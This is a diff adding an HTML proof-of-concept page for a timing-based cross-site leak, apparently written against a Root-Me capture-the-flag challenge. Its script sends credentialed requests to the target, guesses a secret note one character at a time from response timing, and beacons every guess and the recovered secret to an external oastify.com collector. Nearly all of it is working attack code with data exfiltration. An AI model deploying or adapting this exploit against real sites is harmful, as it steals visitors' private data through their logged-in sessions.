@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XS-Leak PoC</title>
+</head>
+<body>
+  <pre id="log">booting...</pre>
+  <script>
+    (async () => {
+      const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
+      const COLLECTOR = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com";
+
+      const qs = new URLSearchParams(location.search);
+      const noteId = Number(qs.get("id") || 1);
+      const chars = qs.get("chars") || "abcdefghijklmnopqrstuvwxyz0123456789_-{}";
+      const maxLen = Number(qs.get("max") || 64);
+      const margin = Number(qs.get("margin") || 1200);
+      const run = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+
+      const logEl = document.getElementById("log");
+
+      function ui(line) {
+        logEl.textContent += "\n" + line;
+      }
+
+      function short(v, n) {
+        return String(v == null ? "" : v).replace(/\s+/g, " ").slice(0, n || 180);
+      }
+
+      function send(ev, msg, extra) {
+        try {
+          const p = new URLSearchParams({
+            run,
+            ev: short(ev, 40),
+            msg: short(msg, 220),
+            data: short(JSON.stringify(extra || {}), 500),
+            t: String(Date.now())
+          });
+          const img = new Image();
+          img.referrerPolicy = "no-referrer";
+          img.src = `${COLLECTOR}?${p.toString()}`;
+        } catch (_) {
+          // ignore
+        }
+      }
+
+      async function log(msg, extra) {
+        ui(msg);
+        send("log", msg, extra);
+      }
+
+      async function probe(prefix) {
+        const url = `${TARGET}/notes/${noteId}/${encodeURIComponent(prefix)}`;
+        const t0 = performance.now();
+        try {
+          await fetch(url, {
+            mode: "no-cors",
+            credentials: "include",
+            cache: "no-store"
+          });
+        } catch (_) {
+          // timing signal only
+        }
+        const dt = performance.now() - t0;
+        send("probe", `${prefix} => ${Math.round(dt)}ms`, { prefix, dt: Math.round(dt) });
+        return dt;
+      }
+
+      send("boot", "script_loaded", { href: location.href, noteId });
+      await log(`run=${run}`);
+      await log(`note_id=${noteId}`);
+
+      const misses = ["zz_not_found_a", "zz_not_found_b", "zz_not_found_c"];
+      const missTimes = [];
+      for (const m of misses) {
+        missTimes.push(await probe(m));
+      }
+      const baseline = missTimes.reduce((a, b) => a + b, 0) / missTimes.length;
+      const threshold = baseline + margin;
+      await log(`baseline=${Math.round(baseline)}ms threshold=${Math.round(threshold)}ms`, {
+        baseline: Math.round(baseline),
+        threshold: Math.round(threshold),
+        margin
+      });
+
+      let prefix = "";
+      let foundAny = false;
+
+      for (let i = 0; i < maxLen; i++) {
+        let found = false;
+        for (const c of chars) {
+          const candidate = prefix + c;
+          const dt = await probe(candidate);
+          await log(`try ${candidate} => ${Math.round(dt)}ms`);
+          if (dt > threshold) {
+            prefix = candidate;
+            found = true;
+            foundAny = true;
+            await log(`hit ${prefix}`);
+            send("hit", prefix, { prefix, dt: Math.round(dt) });
+            break;
+          }
+        }
+        if (!found) break;
+      }
+
+      if (!foundAny) {
+        await log("diag:no_slow_response");
+      }
+
+      await log(`final:${prefix}`);
+      send("final", prefix, { final: prefix });
+    })();
+  </script>
+</body>
+</html>
